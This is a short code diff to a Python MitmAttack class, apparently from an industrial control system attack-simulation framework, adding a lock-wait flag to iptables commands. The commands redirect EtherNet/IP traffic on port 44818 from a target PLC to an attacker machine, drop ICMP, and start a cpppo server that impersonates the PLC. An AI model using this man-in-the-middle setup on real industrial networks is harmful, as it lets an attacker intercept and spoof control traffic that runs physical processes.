@@ -49,11 +49,11 @@ class MitmAttack(SyncedAttack):
 
         Finally, it launches the thread that will respond to the CPPPO requests.
         """
-        os.system('iptables -t nat -A PREROUTING -p tcp -d ' + self.target_plc_ip +
+        os.system('iptables -w -t nat -A PREROUTING -p tcp -d ' + self.target_plc_ip +
                   ' --dport 44818 -j DNAT --to-destination ' + self.attacker_ip + ':44818')
-        os.system('iptables -A FORWARD -p icmp -j DROP')
-        os.system('iptables -A INPUT -p icmp -j DROP')
-        os.system('iptables -A OUTPUT -p icmp -j DROP')
+        os.system('iptables -w -A FORWARD -p icmp -j DROP')
+        os.system('iptables -w -A INPUT -p icmp -j DROP')
+        os.system('iptables -w -A OUTPUT -p icmp -j DROP')
 
         cmd = ['/usr/bin/python3', '-m', 'cpppo.server.enip', '--print', '--address',
                self.attacker_ip + ":44818"]
